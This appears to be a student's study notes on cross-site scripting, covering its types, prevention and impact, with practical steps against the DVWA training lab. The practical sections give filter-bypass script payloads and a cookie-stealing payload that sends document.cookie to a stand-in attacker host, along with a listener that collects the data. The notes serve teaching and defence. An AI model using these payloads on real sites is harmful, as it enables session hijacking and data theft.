## Cross Site Scripting (XSS): 
- `Using JS Language` `User gets affected, Not the Servers`
- Allows attackers to inject malicious scripts into web pages viewed by other users. These scripts can execute in the context of the victim's browser, leading to theft of sensitive information, session hijacking, or defacement of websites.

## Types:
1. Reflected XSS: Malicious script is reflected off a web server and executed in the victim's browser when a user visits a specially crafted link or submits a form.
- typically `embedded in URLs, form inputs`, or other user-controllable parameters and are reflected back in error messages, search results, or dynamically generated pages.
- `malicious code is temporarily injected into the server's response and reflected back to the victim's browser.`

2. Stored/Persistent XSS:
- `Malicious script is stored on the server` (e.g., in a database) and `executed every time in the victim's browser whenever they access the compromised page` containing that script.
- When a victim user visits the page containing the injected code, their browser executes it, allowing the attacker to perform actions like session hijacking, data theft, or defacement.

3. DOM-based XSS: Malicious script is injected into the Document Object Model (DOM) of a web page and executed by the victim's browser, often as a result of client-side JavaScript manipulating user-controlled data without proper validation.

## Example:
- An attacker injects a malicious `script into a comment field on a blog website`. When other users view the comment section, the script executes in their browsers, stealing their session cookies and sending them to the attacker.

## Prevention:
```
Input Validation: Validate and sanitize user input to prevent the injection of script tags and other malicious content.
Output Encoding: Encode user-generated content before rendering it in web pages to ensure that any HTML, JavaScript, or other potentially dangerous characters are displayed as plain text.
HTTPOnly Cookies: Set the HTTPOnly flag on cookies to prevent client-side scripts from accessing them, reducing the risk of session hijacking.
Content Security Policy (CSP): Implement CSP headers to restrict the sources from which scripts can be executed, mitigating the impact of XSS attacks by blocking unauthorized scripts.
Use XSS Filters: Employ web application firewalls or browser-based XSS filters to detect and block malicious script injections at the network or browser level.
```

## Impact:
```
Session Hijacking: Attackers can steal session cookies and impersonate users.
Data Theft: Attackers can steal sensitive information entered by users, such as login credentials or personal data.
Phishing: Attackers can create authentic-looking phishing pages to trick users into divulging sensitive information.
```


## Practical (Reflected-XSS):
1. Open DVWA > Security:Low > Inject Js code: `<script>alert('Hi')</script>` > Pop-Up: Hi > Vulnerable to XSS.
2. Open DVWA > Security:Mid > Inject Js code: `<SCRIPT>alert('Hi')</SCRIPT>` > Pop-Up: Hi > Vulnerable to XSS.
3. Open DVWA > Security:Mid > Inject Js code: `<scr<script>ipt>alert('Hi')</script>` > Pop-Up: Hi > Vulnerable to XSS.

4. Open DVWA > Security:Mid > Inject Js code: `'<SCRIPT>'document.write('<img src="http://<kali-VM-IP>:12345/' + document.cookie + ` ">`); </SCRIPT>`
Listen on the Kali VM: `python -m http.server 12345`

> The session details will show here in the Terminal.

## Practical (Stored-XSS):
1. Open DVWA > Security:Low > Inject Js code: `<script>alert('Hi')</script>` > Pop-Up: Hi > whenever anyone open the page.
2. Open DVWA > Security:Mid > Inject Js code in "Name" Input Field after doing Inspect in the Browser: `<SCRIPT>alert('Hi')</SCRIPT>` > Pop-Up: Hi > whenever anyone open the page > Vulnerable to XSS.























